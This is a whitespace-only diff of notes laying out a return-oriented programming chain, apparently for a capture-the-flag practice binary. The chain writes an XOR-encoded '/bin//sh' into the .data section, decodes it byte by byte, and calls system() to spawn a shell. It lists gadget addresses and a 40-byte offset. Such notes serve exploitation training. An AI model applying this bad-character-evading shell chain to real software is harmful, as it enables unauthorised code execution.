@@ -2,39 +2,39 @@
 
 PLAN of ATTACK:
 Desired Stack	                  Address	    Description
-return address	                0x400770	Exit gracefully <exit@plt>
-call to system	                0x4006f0	<system@plt>
-ptr to /bin//sh	                0x601070	.data section
+return address	                  0x400770	Exit gracefully <exit@plt>
+call to system	                  0x4006f0	<system@plt>
+ptr to /bin//sh	                  0x601070	.data section
 pop rdi; ret	                  0x400b39	pop string into rdi register as param
-xor byte ptr [r15], r14b ; ret	0x400b30	
-	                              0x601077	
+xor byte ptr [r15], r14b ; ret	  0x400b30	
+	                          0x601077	
 pop r15 ; ret	                  0x400b42	pop ptr addr into r15
-xor byte ptr [r15], r14b ; ret	0x400b30	
-	                              0x601076	
+xor byte ptr [r15], r14b ; ret	  0x400b30	
+	                          0x601076	
 pop r15 ; ret	                  0x400b42	pop ptr addr into r15
-xor byte ptr [r15], r14b ; ret	0x400b30	
-	                              0x601075	
+xor byte ptr [r15], r14b ; ret    0x400b30	
+	                          0x601075	
 pop r15 ; ret	                  0x400b42	pop ptr addr into r15
-xor byte ptr [r15], r14b ; ret	0x400b30	
-	                              0x601074	
+xor byte ptr [r15], r14b ; ret	  0x400b30	
+	                          0x601074	
 pop r15 ; ret	                  0x400b42	pop ptr addr into r15
-xor byte ptr [r15], r14b ; ret	0x400b30	
-	                              0x601073	
+xor byte ptr [r15], r14b ; ret    0x400b30	
+	                          0x601073	
 pop r15 ; ret	                  0x400b42	pop ptr addr into r15
-xor byte ptr [r15], r14b ; ret	0x400b30	
-	                              0x601072	
+xor byte ptr [r15], r14b ; ret	  0x400b30	
+	                          0x601072	
 pop r15 ; ret	                  0x400b42	pop ptr addr into r15
-xor byte ptr [r15], r14b ; ret	0x400b30	
-	                              0x601071	
+xor byte ptr [r15], r14b ; ret	  0x400b30	
+	                          0x601071	
 pop r15 ; ret	                  0x400b42	pop ptr addr into r15
-xor byte ptr [r15], r14b ; ret	0x400b30	
-	                              0x601070
-                                0x18	
-pop r14 ; pop r15 ; ret         0x400b40	pop ptr addr into r15 XOR byte into r14
-mov qword ptr [r13], r12 ; ret	0x400b34	write string to .data section
-	                              0x601070	
-	                              7zqv77kp	
-pop r12 ; pop r13 ; ret	        0x400b3b 	pop string into r12 and ptr in r13
+xor byte ptr [r15], r14b ; ret	  0x400b30	
+	                          0x601070
+                                  0x18	
+pop r14 ; pop r15 ; ret           0x400b40	pop ptr addr into r15 XOR byte into r14
+mov qword ptr [r13], r12 ; ret	  0x400b34	write string to .data section
+	                          0x601070	
+	                          7zqv77kp	
+pop r12 ; pop r13 ; ret	          0x400b3b 	pop string into r12 and ptr in r13
 
 
 [$] Buffer + Base Pointer: 40
